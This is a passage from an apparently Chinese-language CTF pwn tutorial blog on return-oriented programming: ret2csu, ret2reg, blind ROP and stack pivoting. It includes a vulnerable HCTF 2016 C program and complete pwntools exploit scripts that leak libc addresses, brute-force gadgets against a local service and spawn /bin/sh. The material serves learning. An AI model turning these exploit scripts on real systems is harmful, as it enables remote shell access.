class="line">truewrite(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">truevulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./ret2csu'</span>)</span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x4005F0</span></span><br><span class="line">csu_end_addr = <span class="number">0x400606</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdx=r15 第3个参数</span></span><br><span class="line">    <span class="comment"># rsi=r14 第2个参数</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d 第1个参数</span></span><br><span class="line">    <span class="comment"># 这里之所有要加一个p64(0),是因为pop操作不是从rsp而是从rsp+8开始的</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x88</span></span><br><span class="line">    payload += p64(csu_end_addr) + p64(<span class="number">0</span>) + p64(rbx)\</span><br><span class="line">        + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    <span class="comment"># 填充栈上pop/add,共0x38个字节</span></span><br><span class="line">    payload += <span class="string">'b'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 in order to leak write_addr</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment"># RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"><span class="comment"># write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main_addr)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">execve_off = libc.symbols[<span class="string">'write'</span>]-libc.symbols[<span class="string">'execve'</span>]</span><br><span class="line">execve_addr = write_addr - execve_off</span><br><span class="line">log.success(<span class="string">'execve_addr: '</span> + hex(execve_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0,bss_base,16)</span></span><br><span class="line"><span class="comment"># read execve_addr and /bin/sh\x00</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_base, <span class="number">16</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment"># sh.recv()</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment"># execve(bss_base+8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_base, bss_base + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="x32-ret2reg">0x32 ret2reg</h3>
<h4 id="使用原理-1">① 使用原理</h4>
<p>ret2reg(return-to-address)主要目的是绕过地址随机化(Address Space Layout Randomization, ASLR). 顾名思义, 就是控制寄存器的值, 利用<code>call, jnz, jmp</code>等跳转指令控制程序执行流以跳转到payload.</p>
<h4 id="使用步骤">② 使用步骤</h4>
<ol type="1">
<li>调试程序, 查看溢出函数返回时哪个寄存器的值指向溢出缓冲区.</li>
<li>经第1步得知reg寄存器指向缓冲区, 查找漏洞程序中<code>call reg</code>或<code>jmp reg</code>指令.(可利用objdump或ROPgadget) 然后将EIP的值指向该指令的地址.</li>
<li>在reg指向的栈空间写入shellcode</li>
</ol>
<h4 id="参考链接">③ 参考链接</h4>
<p>第一篇: <a href="https://blog.csdn.net/linyt/article/details/43612409" target="_blank" rel="noopener">使用ret2reg攻击绕过地址混淆</a></p>
<p>第二篇: <a href="http://spd.dropsec.xyz/2016/11/02/ret2reg%E6%8A%80%E6%9C%AF/" target="_blank" rel="noopener">使用ret2reg攻击绕过地址混淆</a></p>
<p>第三篇: <a href="https://silic.wiki/%E4%B9%A0%E7%A7%91%E6%97%A7%E7%AB%99:ret2reg%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87aslr%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">ret2reg指令绕过ASLR堆栈溢出</a></p>
<hr>
<h3 id="x33-brop">0x33 BROP</h3>
<h4 id="使用原理-2">① 使用原理</h4>
<p>BROP(Blind Return Oriented Programming), 顾名思义, 是一种盲ROP, 在<strong>没有源程序分析</strong>的情况下对目标远程程序进行攻击, 劫持程序执行流. 这种方式在一般情况下可以绕过ASLR、NX、Canary保护. 但是使用这种方式有两个条件:</p>
<blockquote>
<ol type="1">
<li>目标服务(程序)存在栈溢出</li>
<li>运行远程程序的服务端在崩溃之后会重新启动, 或者重启后地址与先前的一样.(即使程序由ASLR保护, 仅仅在最初启动有效果). 目前Nginx, MySQL, Apache, OpenSSH等服务器应用都符合这种特性.</li>
</ol>
</blockquote>
<h4 id="使用步骤-1">② 使用步骤</h4>
<ol type="1">
<li><p><strong>Get buffer length</strong></p>
<p>通过爆破实现, 从1开始爆破, 直到程序崩溃(ebp/rbp)被覆盖. 此时输入的字符串长度即为栈溢出长度.</p></li>
<li><p><strong>Stack Reading</strong></p>
<p>获取栈上的canary, ebp, return address.</p>
<p>经典栈结构如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer|canary|fame pointer(ebp/rbp)|return address</span><br></pre></td></tr></table></figure>
<blockquote>
<p>我们同样可以通过逐字节爆破, 爆破canary.(<strong>32位爆破4x256=1024次, 64位爆破8x256=2048次</strong>, 注意这里的4和8代表的是字节数, 256是表示每个字节由256中可能) 同样地, 我们可以爆破出栈基址指针、返回地址的值.</p>
</blockquote></li>
<li><p><strong>Blind ROP</strong></p>
<p>经过上面两部, 我们可以控制溢出后的执行流, 这时我们就尝试跳转到gadgets, 根据有无crash来判断这个gadgets是否有效, 得到输出函数如: put, write等, 以此来leak出更多的信息.</p></li>
<li><p><strong>Optimization</strong></p>
<p>上一步已经leak出重要函数(如: system, execve等函数)的地址信息了, 在这一步可以拼凑出payload进行攻击.</p></li>
</ol>
<h4 id="使用例子">③ 使用例子</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2016 HCTF PWN题</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">truesetbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">truesetbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line">truesetbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"WelCome my friend,Do you know password?"</span>);</span><br><span class="line">true<span class="keyword">if</span>(!check())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Do not dump my memory"</span>);</span><br><span class="line">true&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"No password, no game"</span>);</span><br><span class="line">true&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(buf,<span class="string">"aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk"</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./brop')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbufferflow_length</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'WelCome my friend,Do you know password?\n'</span>)</span><br><span class="line">            sh.send(i * <span class="string">'a'</span>)</span><br><span class="line">            output = sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">'No password'</span>):</span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(length)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">            payload = <span class="string">'a'</span> * length + p64(addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">print</span> content</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'one success stop gadget addr: 0x%x'</span> % (addr)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_gadget</span><span class="params">(csu_last, csu_middle, saved_addr, arg1=<span class="number">0x0</span>, arg2=<span class="number">0x0</span>, arg3=<span class="number">0x0</span>)</span>:</span></span><br><span class="line">    payload = p64(csu_last)  <span class="comment"># pop rbx,rbp,r12,r13,r14,r15, ret</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>)  <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)  <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(saved_addr)  <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)  <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)  <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)  <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(csu_middle)  <span class="comment"># will call [rbx + r12 * 0x8]</span></span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">56</span>  <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span><span class="params">(length, stop_gadget, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(</span><br><span class="line">            stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">        <span class="comment"># stop gadget returns memory</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">'WelCome'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span><span class="params">(length, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + <span class="string">'a'</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_brop_gadget</span><span class="params">(length, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400740</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'possible brop gadget: 0x%x'</span> % addr</span><br><span class="line">            <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'success brop gadget: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(length, rdi_ret, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'A'</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">'\x7fELF'</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'find puts@plt addr: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length, rdi_ret, puts_plt, leak_addr, stop_gadget)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">"\nWelCome"</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">""</span>:</span><br><span class="line">            data = <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakfunction</span><span class="params">(length, rdi_ret, puts_plt, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += len(data)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'code'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment"># stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment"># brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment"># puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line"><span class="comment"># leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">'\nWelCome'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="x40-高级rop">0x40 高级ROP</h2>
<h3 id="x41-ret2_dl_runtime_resolve">0x41 ret2_dl_runtime_resolve</h3>
<hr>
<h2 id="x50-花式rop">0x50 花式ROP</h2>
<h3 id="x51-stack-pivoting">0x51 stack pivoting</h3>
<h4 id="使用原理-3">① 使用原理</h4>
<p>Stack pivoting 劫持栈指针, 目的是将栈劫持到攻击者能够控制的内存上去, 再做ROP. 原理如下:</p>
<div style="text-align: center;">
<figure>
<img src="/2019/06/06/1.2-菜鸟学PWN之ROP学习/15136516601572.jpg" alt="Stack Pivoting原理"><figcaption>Stack Pivoting原理</figcaption>
</figure>
</div>
<p>)</p>
<h4 id="使用情景">② 使用情景</h4>
<ol type="1">
<li>可以控制的栈溢出字节数较少, 难以构造较长的ROP链(例如: 在<code>fgets()</code>或<code>read()</code>函数中添加了长度限制, 只能溢出很少字节)</li>
<li>开启了PIE(Position-Independent Executable), 无法获得栈地址. 此时就可以通过Stack pivot将栈劫持到能够控制的已知区域.</li>
<li>其他漏洞难以利用, stack pivot能够使得一些非栈溢出漏洞变成栈溢出漏洞.(例如: 将程序劫持到heap空间中)</li>
</ol>
<h4 id="使用要求">③ 使用要求</h4>
<ol type="1">
<li><p>可以控制程序执行流: 可控内存, 位置已知, 有读写权. (例如: bss段, 至少还有4k[内存按页分配], 有读写权限; heap空间: 需要泄露堆地址)</p></li>
<li><p>可以控制rsp(esp)指针. (例如: <code>libc_csu_init</code>中的gadgets, 我们通过偏移即可控制rsp指针<code>pop rsp</code>, 因为在x64系统中, 是通过寄存器来传参的)</p>
